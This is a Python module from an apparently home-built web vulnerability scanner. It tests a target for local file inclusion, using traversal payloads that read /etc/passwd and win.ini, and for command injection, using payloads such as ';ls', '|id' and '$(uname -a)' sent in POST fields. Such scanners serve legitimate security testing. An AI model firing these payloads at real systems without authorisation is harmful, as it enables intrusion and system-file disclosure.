# modules/vulnerability_scanning/lfi_rce.py
import requests
from pathlib import Path
from core.utils.logger import CyberLogger
from core.engines.fuzzer import Fuzzer # Import the Fuzzer
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

class PayloadTester:
    """Base class for payload testing"""
    def __init__(self, target_url, payload_type):
        self.target = target_url
        self.payload_type = payload_type
        self.logger = CyberLogger()
        self.fuzzer = Fuzzer() # Initialize the Fuzzer
        self.file_payloads = self._load_payloads_from_file() # Load from file initially

    def _load_payloads_from_file(self):
        payload_file = Path(f"resources/payloads/{self.payload_type}.txt")
        if not payload_file.exists():
            self.logger.warning(f"Missing payload file: {payload_file}. Will rely on Fuzzer's default payloads.")
            return []
        with open(payload_file) as f:
            return [line.strip() for line in f if line.strip()]

    # We will now use the fuzzer to generate payloads in the test methods directly
    # rather than a generic 'self.payloads' property that combines them.

class LFITester(PayloadTester):
    def __init__(self, target_url):
        super().__init__(target_url, "lfi")
        # Define specific LFI-related payloads that the Fuzzer might not have by default
        self.lfi_specific_payloads = [
            "../../../../../../../../etc/passwd",
            "....//....//....//....//....//windows/win.ini",
            "/etc/passwd%00",
            "file:///etc/passwd",
            "php://filter/resource=/etc/passwd",
            "C:\\boot.ini"
        ]

    def test(self):
        results = []
        
        # Combine file-based payloads with fuzzer's path traversal payloads
        all_lfi_payloads = list(set(self.file_payloads + self.fuzzer.path_traversal_payloads + self.lfi_specific_payloads))
        
        self.logger.info(f"Testing LFI with {len(all_lfi_payloads)} payloads.")

        # Assume target has a parameter 'file' for LFI (e.g., http://example.com/?file=...)
        # In a real scenario, you'd integrate with the crawler to find parameters.
        # For now, we'll hardcode 'file' or assume the target URL has a parameter.
        
        # If the target URL already has parameters, we will fuzz existing ones.
        # Otherwise, we will append a 'file' parameter.
        parsed_target = urlparse(self.target)
        if parsed_target.query:
            # Fuzz existing parameters if any are present
            fuzzed_urls_for_testing = self.fuzzer.fuzz_url_params(self.target, payloads=all_lfi_payloads)
        else:
            # Construct URLs by adding a 'file' parameter for LFI testing
            fuzzed_urls_for_testing = []
            for payload in all_lfi_payloads:
                fuzzed_url = f"{self.target}?file={payload}"
                fuzzed_urls_for_testing.append(fuzzed_url)
                self.logger.debug(f"Testing LFI URL: {fuzzed_url}")


        for test_url in fuzzed_urls_for_testing:
            try:
                resp = requests.get(test_url, timeout=5) # Increased timeout
                if "root:" in resp.text.lower() or "for 16-bit app support" in resp.text.lower():
                    results.append(f"LFI vulnerable with payload: {test_url}")
                    self.logger.warning(f"LFI vulnerability found: {test_url}")
            except requests.exceptions.RequestException as e:
                self.logger.error(f"LFI test request failed for {test_url}: {e}")
            except Exception as e:
                self.logger.error(f"Unexpected LFI test error for {test_url}: {e}")
        
        if not results:
            self.logger.info("No LFI vulnerabilities found.")
        return results

class RCETester(PayloadTester):
    def __init__(self, target_url):
        super().__init__(target_url, "rce")
        # Define specific RCE-related payloads
        self.rce_specific_payloads = [
            ";ls", "|id", "`whoami`", "$(uname -a)", "&& dir", "|| ipconfig"
        ]

    def test(self):
        results = []
        
        # Combine file-based payloads with fuzzer's common/string payloads and specific RCE payloads
        all_rce_payloads = list(set(self.file_payloads + self.fuzzer.common_payloads + self.fuzzer.string_payloads + self.rce_specific_payloads))
        
        self.logger.info(f"Testing RCE with {len(all_rce_payloads)} payloads.")

        # For RCE, we'll typically test POST data or command injection points.
        # Assume a simple POST request with a parameter named 'cmd' or 'input'.
        # In a real scenario, this would dynamically find POST forms via crawler.
        
        # Example original POST data (if available or guessed)
        original_post_data = {"cmd": "echo test"} # Or {"input": "test"}

        if not original_post_data:
            self.logger.warning("No original POST data provided for RCE fuzzing. Skipping.")
            return []

        fuzzed_data_list = self.fuzzer.fuzz_post_data(self.target, original_post_data, payloads=all_rce_payloads)

        for fuzzed_data in fuzzed_data_list:
            try:
                self.logger.debug(f"Testing RCE POST to {self.target} with data: {fuzzed_data}")
                resp = requests.post(self.target, data=fuzzed_data, timeout=7) # Increased timeout
                
                # Check for common command execution indicators
                if any(marker in resp.text.lower() for marker in ["uid=", "windows", "command not found", "volume in drive", "system32"]):
                    results.append(f"RCE vulnerable with data: {fuzzed_data} at {self.target}")
                    self.logger.warning(f"RCE vulnerability found: {fuzzed_data} at {self.target}")
            except requests.exceptions.RequestException as e:
                self.logger.error(f"RCE test request failed for {self.target} with data {fuzzed_data}: {e}")
            except Exception as e:
                self.logger.error(f"Unexpected RCE test error for {self.target}: {e}")

        if not results:
            self.logger.info("No RCE vulnerabilities found.")
        return results